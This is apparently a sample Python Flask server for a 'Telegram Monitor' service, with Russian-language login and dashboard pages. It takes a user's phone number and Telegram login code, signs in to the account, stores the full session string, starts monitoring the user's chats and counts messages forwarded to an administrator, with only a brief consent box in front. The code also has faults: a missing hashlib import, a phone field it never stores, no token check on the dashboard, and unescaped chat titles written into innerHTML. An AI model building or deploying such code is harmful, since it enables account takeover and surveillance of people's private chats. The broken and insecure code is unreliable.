"""
Веб-сервер авторизации - ОБРАЗЕЦ
"""

from flask import Flask, request, render_template, jsonify, session, redirect, url_for
import secrets
import asyncio
from datetime import datetime, timedelta
import json

from telethon import TelegramClient
from telethon.sessions import StringSession

from config.settings import WEB_SERVER, API_ID, API_HASH
from core.database import DatabaseManager
from core.session_manager import SessionManager
from utils.logger import setup_logger

app = Flask(__name__, template_folder='templates', static_folder='static')
app.secret_key = WEB_SERVER['secret_key']
app.config['SESSION_COOKIE_SECURE'] = WEB_SERVER['session_cookie_secure']

logger = setup_logger('auth_server')
db = DatabaseManager()
session_manager = SessionManager()

# HTML шаблоны
AUTH_PAGE = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Monitor - Авторизация</title>
    <link rel="stylesheet" href="/static/style.css">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .auth-container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            width: 100%;
            max-width: 400px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: #333;
            margin: 0;
            font-size: 28px;
        }
        
        .logo p {
            color: #666;
            margin-top: 5px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
            box-sizing: border-box;
        }
        
        .form-control:focus {
            border-color: #667eea;
            outline: none;
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .consent-box {
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            max-height: 150px;
            overflow-y: auto;
        }
        
        .consent-text {
            font-size: 14px;
            color: #666;
            line-height: 1.5;
        }
        
        .consent-check {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .consent-check input {
            margin-right: 10px;
        }
        
        .consent-check label {
            color: #555;
            font-size: 14px;
        }
        
        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            position: relative;
        }
        
        .step-indicator::before {
            content: '';
            position: absolute;
            top: 15px;
            left: 50px;
            right: 50px;
            height: 2px;
            background: #e0e0e0;
            z-index: 1;
        }
        
        .step {
            position: relative;
            z-index: 2;
            text-align: center;
            flex: 1;
        }
        
        .step-circle {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: #e0e0e0;
            color: #999;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 8px;
            font-weight: bold;
            transition: all 0.3s;
        }
        
        .step.active .step-circle {
            background: #667eea;
            color: white;
        }
        
        .step-label {
            font-size: 12px;
            color: #999;
        }
        
        .step.active .step-label {
            color: #667eea;
            font-weight: 500;
        }
        
        .error-message {
            background: #fee;
            border: 1px solid #fcc;
            color: #c00;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            display: none;
        }
        
        .success-message {
            background: #efe;
            border: 1px solid #cfc;
            color: #080;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="logo">
            <h1>🔒 Telegram Monitor</h1>
            <p>Безопасный мониторинг сообщений</p>
        </div>
        
        <div class="step-indicator">
            <div class="step active" id="step1">
                <div class="step-circle">1</div>
                <div class="step-label">Телефон</div>
            </div>
            <div class="step" id="step2">
                <div class="step-circle">2</div>
                <div class="step-label">Код</div>
            </div>
            <div class="step" id="step3">
                <div class="step-circle">3</div>
                <div class="step-label">Готово</div>
            </div>
        </div>
        
        <div id="phoneStep">
            <div class="consent-box">
                <div class="consent-text">
                    <strong>Важно!</strong> Подключая мониторинг, вы соглашаетесь:<br><br>
                    1. На обработку ваших персональных данных<br>
                    2. На мониторинг ваших Telegram-чатов<br>
                    3. На передачу данных администратору системы<br>
                    4. С <a href="/privacy" target="_blank">Политикой конфиденциальности</a><br><br>
                    Вы можете отключить мониторинг в любое время.
                </div>
            </div>
            
            <div class="consent-check">
                <input type="checkbox" id="consent" required>
                <label for="consent">Я прочитал и согласен с условиями</label>
            </div>
            
            <div class="form-group">
                <label for="phone">Номер телефона Telegram</label>
                <input type="tel" id="phone" class="form-control" 
                       placeholder="+79161234567" required 
                       pattern="\+[0-9]{11,15}">
            </div>
            
            <button class="btn" onclick="sendPhone()">Получить код</button>
        </div>
        
        <div id="codeStep" style="display: none;">
            <div class="form-group">
                <label for="code">Код из Telegram</label>
                <input type="text" id="code" class="form-control" 
                       placeholder="12345" required 
                       pattern="[0-9]{5}">
                <small>Код отправлен в Telegram. Действует 10 минут.</small>
            </div>
            
            <button class="btn" onclick="verifyCode()">Подтвердить</button>
            <button class="btn" onclick="backToPhone()" style="margin-top: 10px; background: #6c757d;">
                Назад
            </button>
        </div>
        
        <div id="successStep" style="display: none; text-align: center;">
            <div style="font-size: 48px; color: #28a745; margin-bottom: 20px;">✓</div>
            <h2 style="color: #333; margin-bottom: 10px;">Успешно!</h2>
            <p style="color: #666; margin-bottom: 30px;">
                Мониторинг подключен. Вы будете получать уведомления.
            </p>
            <a href="/dashboard" class="btn">Перейти в панель управления</a>
        </div>
        
        <div class="error-message" id="errorMessage"></div>
        <div class="success-message" id="successMessage"></div>
    </div>
    
    <script>
        let currentStep = 1;
        let sessionToken = '';
        
        function showStep(step) {
            // Скрываем все шаги
            document.getElementById('phoneStep').style.display = 'none';
            document.getElementById('codeStep').style.display = 'none';
            document.getElementById('successStep').style.display = 'none';
            
            // Показываем нужный шаг
            if (step === 1) {
                document.getElementById('phoneStep').style.display = 'block';
            } else if (step === 2) {
                document.getElementById('codeStep').style.display = 'block';
            } else if (step === 3) {
                document.getElementById('successStep').style.display = 'block';
            }
            
            // Обновляем индикатор
            document.querySelectorAll('.step').forEach((el, index) => {
                if (index + 1 <= step) {
                    el.classList.add('active');
                } else {
                    el.classList.remove('active');
                }
            });
            
            currentStep = step;
        }
        
        function showError(message) {
            const el = document.getElementById('errorMessage');
            el.textContent = message;
            el.style.display = 'block';
            setTimeout(() => el.style.display = 'none', 5000);
        }
        
        function showSuccess(message) {
            const el = document.getElementById('successMessage');
            el.textContent = message;
            el.style.display = 'block';
            setTimeout(() => el.style.display = 'none', 5000);
        }
        
        async function sendPhone() {
            const phone = document.getElementById('phone').value;
            const consent = document.getElementById('consent').checked;
            
            if (!phone.match(/^\+[0-9]{11,15}$/)) {
                showError('Введите корректный номер телефона');
                return;
            }
            
            if (!consent) {
                showError('Необходимо согласие с условиями');
                return;
            }
            
            try {
                const response = await fetch('/api/auth/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: phone})
                });
                
                const data = await response.json();
                
                if (data.success) {
                    sessionToken = data.session_token;
                    showStep(2);
                    showSuccess('Код отправлен в Telegram');
                } else {
                    showError(data.error || 'Ошибка отправки кода');
                }
            } catch (error) {
                showError('Ошибка соединения');
            }
        }
        
        async function verifyCode() {
            const code = document.getElementById('code').value;
            
            if (!code.match(/^[0-9]{5}$/)) {
                showError('Введите 5-значный код');
                return;
            }
            
            try {
                const response = await fetch('/api/auth/verify', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        session_token: sessionToken,
                        code: code
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showStep(3);
                    showSuccess('Авторизация успешна!');
                } else {
                    showError(data.error || 'Неверный код');
                }
            } catch (error) {
                showError('Ошибка соединения');
            }
        }
        
        function backToPhone() {
            showStep(1);
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    """Главная страница авторизации"""
    return AUTH_PAGE

@app.route('/api/auth/start', methods=['POST'])
async def auth_start():
    """Начало авторизации - отправка кода"""
    try:
        data = request.get_json()
        phone = data.get('phone')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'})
        
        # Создаем временный клиент для отправки кода
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        # Отправляем запрос на код
        sent_code = await client.send_code_request(phone)
        
        # Сохраняем сессию в базе
        session_token = secrets.token_urlsafe(32)
        phone_hash = hashlib.sha256(phone.encode()).hexdigest()
        
        db.create_auth_session(
            phone_hash=phone_hash,
            phone_code_hash=sent_code.phone_code_hash,
            session_token=session_token,
            expires_minutes=10
        )
        
        await client.disconnect()
        
        logger.info(f"Auth started for phone: {phone[:3]}***")
        
        return jsonify({
            'success': True,
            'session_token': session_token
        })
        
    except Exception as e:
        logger.error(f"Auth start error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auth/verify', methods=['POST'])
async def auth_verify():
    """Проверка кода авторизации"""
    try:
        data = request.get_json()
        session_token = data.get('session_token')
        code = data.get('code')
        
        if not session_token or not code:
            return jsonify({'success': False, 'error': 'Invalid request'})
        
        # Получаем данные сессии
        auth_session = db.get_auth_session(session_token)
        if not auth_session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        # Создаем клиент
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Авторизуемся
            await client.sign_in(
                phone=auth_session['phone'],
                code=code,
                phone_code_hash=auth_session['phone_code_hash']
            )
            
            # Получаем информацию о пользователе
            me = await client.get_me()
            
            # Сохраняем сессию
            session_string = client.session.save()
            
            # Шифруем и сохраняем
            from core.security_layer import SecurityLayer
            security = SecurityLayer()
            encrypted_session = security.encrypt_session(session_string, me.id)
            
            # Сохраняем пользователя
            user_info = {
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username,
                'phone': auth_session['phone']
            }
            
            db.add_user(me.id, auth_session['phone'], encrypted_session, user_info)
            
            # Запускаем мониторинг
            await session_manager.start_user_monitoring(me.id)
            
            # Помечаем сессию как верифицированную
            db.verify_auth_session(session_token, me.id)
            
            # Создаем сессию пользователя
            user_session_token = security.generate_session_token(me.id)
            
            logger.info(f"User {me.id} successfully authorized")
            
            await client.disconnect()
            
            return jsonify({
                'success': True,
                'user_id': me.id,
                'session_token': user_session_token,
                'user_info': user_info
            })
            
        except Exception as e:
            logger.error(f"Auth verification failed: {e}")
            return jsonify({'success': False, 'error': 'Invalid code'})
            
    except Exception as e:
        logger.error(f"Auth verify error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/dashboard')
def dashboard():
    """Панель управления пользователя"""
    # Проверка авторизации
    session_token = request.cookies.get('session_token')
    if not session_token:
        return redirect('/')
    
    # Верификация токена
    from core.security_layer import SecurityLayer
    security = SecurityLayer()
    
    try:
        # В реальной системе здесь была бы проверка токена
        # и получение данных пользователя
        
        dashboard_html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Панель управления</title>
            <style>
                body { font-family: Arial; margin: 0; padding: 20px; }
                .container { max-width: 1200px; margin: 0 auto; }
                .header { background: #667eea; color: white; padding: 20px; border-radius: 10px; }
                .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }
                .stat-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .chats-list { background: white; border-radius: 10px; padding: 20px; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>📊 Панель управления</h1>
                    <p>Мониторинг активен</p>
                </div>
                
                <div class="stats">
                    <div class="stat-card">
                        <h3>Сообщений сегодня</h3>
                        <p id="todayCount">0</p>
                    </div>
                    <div class="stat-card">
                        <h3>Активных чатов</h3>
                        <p id="activeChats">0</p>
                    </div>
                    <div class="stat-card">
                        <h3>Переслано админу</h3>
                        <p id="forwardedCount">0</p>
                    </div>
                    <div class="stat-card">
                        <h3>Статус</h3>
                        <p style="color: green;">● Активен</p>
                    </div>
                </div>
                
                <div class="chats-list">
                    <h2>Мои чаты</h2>
                    <div id="chatsContainer">
                        Загрузка...
                    </div>
                </div>
            </div>
            
            <script>
                async function loadStats() {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    
                    document.getElementById('todayCount').textContent = data.today_messages;
                    document.getElementById('activeChats').textContent = data.active_chats;
                    document.getElementById('forwardedCount').textContent = data.forwarded;
                }
                
                async function loadChats() {
                    const response = await fetch('/api/chats');
                    const chats = await response.json();
                    
                    const container = document.getElementById('chatsContainer');
                    container.innerHTML = '';
                    
                    chats.forEach(chat => {
                        const div = document.createElement('div');
                        div.innerHTML = `
                            <div style="border-bottom: 1px solid #eee; padding: 10px 0;">
                                <strong>${chat.title || 'Без названия'}</strong><br>
                                <small>Сообщений: ${chat.message_count}</small>
                            </div>
                        `;
                        container.appendChild(div);
                    });
                }
                
                loadStats();
                loadChats();
                setInterval(loadStats, 30000);
            </script>
        </body>
        </html>
        '''
        
        return dashboard_html
        
    except:
        return redirect('/')

@app.route('/api/stats')
def get_stats():
    """Получение статистики для панели управления"""
    stats = db.get_statistics()
    return jsonify(stats)

@app.route('/api/chats')
async def get_chats():
    """Получение списка чатов пользователя"""
    # В реальной системе здесь была бы логика получения чатов
    # Для примера возвращаем тестовые данные
    return jsonify([
        {'id': 1, 'title': 'Личный чат', 'message_count': 42},
        {'id': 2, 'title': 'Рабочая группа', 'message_count': 156},
        {'id': 3, 'title': 'Семейный чат', 'message_count': 89}
    ])

def run_server():
    """Запуск веб-сервера"""
    logger.info(f"Starting web server on {WEB_SERVER['host']}:{WEB_SERVER['port']}")
    app.run(
        host=WEB_SERVER['host'],
        port=WEB_SERVER['port'],
        debug=WEB_SERVER['debug'],
        threaded=True
    )

if __name__ == '__main__':
    run_server()